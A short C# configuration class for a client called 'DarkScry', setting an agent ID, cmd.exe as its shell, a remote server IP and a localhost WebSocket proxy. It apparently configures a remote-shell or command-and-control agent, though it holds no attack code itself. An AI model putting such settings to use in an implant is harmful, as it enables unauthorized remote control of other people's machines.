

namespace DarkScryClient
{
	enum ProxyKindOptions
	{
		WebSocketBrowser = 0,
	}
	internal class Config
	{
		public static string agent_id = "60a7105e-3445-4ce3-a672-8cc6756dccb1";
		public static string MainShell = "cmd.exe";
		public static bool IsMainShellRuning = false;
                public static string ServerIp = "172.236.98.55";
                public static readonly string AgentName = "DarkScry Cleint";
                public static readonly string AgnetVersion = "1.0.0";

		public static readonly bool UseProxy = true;
		public static string ProxyHost = "localhost";
		public static readonly ProxyKindOptions ProxyKind = ProxyKindOptions.WebSocketBrowser;
	}
}
